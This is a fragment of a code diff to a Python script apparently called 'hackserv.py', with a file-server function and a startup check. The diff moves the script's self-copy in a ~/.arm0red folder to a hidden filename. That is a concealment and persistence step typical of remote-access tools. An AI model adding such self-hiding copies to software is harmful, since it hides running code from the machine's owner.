@@ -310,11 +310,10 @@ def fileServer(): # Open a file server on this device.
     s.close()
     
 def srtChk(): # Startup Check. (Still in testing!)
-    script = sys.argv
-    name = str(script[0])
+    name = str(sys.argv[0])
     hd = str(os.path.expanduser('~'))
     hdPath = hd + '/.arm0red'
-    clone = hdPath + '/hackserv.py'
+    clone = hdPath + '/.hackserv.py'
     if name == clone:
         if debugmode:
             print(name + " and "+ clone + " are the same file!")
